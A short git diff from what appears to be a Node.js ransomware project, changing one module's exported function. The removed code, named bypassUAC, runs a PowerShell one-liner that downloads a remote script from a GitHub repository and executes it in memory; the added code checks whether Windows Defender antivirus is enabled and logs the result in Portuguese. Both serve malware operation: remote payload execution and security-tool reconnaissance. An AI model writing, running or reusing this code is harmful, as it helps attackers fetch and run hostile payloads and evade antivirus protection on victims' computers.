@@ -24,12 +24,12 @@ const executeCommand = (
   });
 };
 
-const bypassUAC = async () => {
-  await executeCommand(
-    "iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/ek1l/Ransomware-Nodejs/refs/heads/main/tools/msi.ps1')",
+const isActive = async () => {
+  const isActive = await executeCommand(
+    'Get-MpComputerStatus | Select AntivirusEnabled',
     true,
   );
-  console.log('>>>>>>>>>>>>>>>>>>>>>>>>>>');
+  console.log('ANTIVIRUS ATIVO? >>>>>>>>>>>>>>>>>>>>>>>>>', isActive);
 };
 
-export default bypassUAC;
+export default isActive;
